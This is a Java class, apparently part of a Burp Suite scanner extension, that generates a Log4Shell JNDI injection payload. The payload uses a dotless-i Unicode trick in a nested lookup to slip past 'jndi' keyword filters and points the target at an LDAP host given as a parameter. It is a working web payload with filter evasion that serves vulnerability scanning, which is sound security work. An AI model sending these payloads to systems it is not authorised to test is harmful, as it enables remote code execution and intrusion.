package burp.poc.impl;

import burp.poc.IPOC;
import burp.utils.Utils;

// Invalid unicode character, dot less i

public class POC12 implements IPOC {
    @Override
    public String generate(String domain) {
        return "${jnd${upper:ı}:ldap://" + domain + "/" + Utils.GetRandomString(Utils.GetRandomNumber(2, 5)) + "}";
    }

    @Override
    public int getType() {
        return POC_TYPE_LDAP;
    }

    @Override
    public int getIndex() {
        return 12;
    }
}
